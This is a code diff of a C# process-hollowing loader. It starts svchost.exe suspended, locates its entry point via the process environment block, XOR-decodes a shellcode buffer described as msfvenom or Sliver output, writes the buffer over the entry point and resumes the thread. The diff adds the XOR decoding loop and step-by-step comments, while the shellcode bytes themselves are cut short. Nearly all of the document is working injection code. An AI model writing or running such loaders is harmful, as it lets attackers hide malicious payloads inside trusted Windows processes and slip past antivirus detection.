@@ -51,7 +51,6 @@ namespace hollow
 		    public IntPtr MoreReserved;
 		}
 
-
 		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
 		static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
@@ -68,12 +67,18 @@ namespace hollow
 		private static extern uint ResumeThread(IntPtr hThread);
 
 		static void Main(string[] args)
-		{
+		{ 
+			//msfvenom or sliver shellcode -f csharp
+			byte[] buf = new byte[659] {0xfc,0x48,0x83,0xe4,0xf0,0xe8...}
+			
+			//start 'svchost.exe' in a suspended state 
 			STARTUPINFO si = new STARTUPINFO();
 			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
 			bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
 			    IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+			// Get process envrionment block (PEB) memory address of suspended process 
 			PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
 			uint tmp = 0;
 			IntPtr hProcess = pi.hProcess;
@@ -97,11 +102,17 @@ namespace hollow
 			
 			IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
 
-      			//msfvenom or sliver shellcode -f csharp
-			byte[] buf = new byte[659] {0xfc,0x48,0x83,0xe4,0xf0,0xe8...
+      			//decode the XOR payload
+		        for (int i = 0; i < buf.Length; i++)
+		        {
+		        	buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+		        }
+		        Console.WriteLine("XOR-decoded payload.");
 
+			//overwrite the memory at the identified address to 'hijack' the entrypoint of the executable 
 			WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
 
+			//resume the thread to trigger our payload 
 			ResumeThread(pi.hThread);
 		}
 	}
